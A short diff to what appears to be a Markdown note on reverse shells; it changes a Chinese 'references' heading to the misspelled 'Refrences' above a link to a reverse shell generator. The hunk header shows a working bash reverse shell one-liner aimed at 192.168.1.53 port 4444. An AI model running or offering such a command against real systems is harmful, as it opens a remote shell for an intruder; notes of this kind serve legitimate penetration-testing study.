@@ -98,6 +98,6 @@ bash -i >& /dev/tcp/192.168.1.53/4444 0>&1
 
 ---
 
-参考链接
+Refrences
 
 - [Reverse Shell Generator](https://www.revshells.com/)
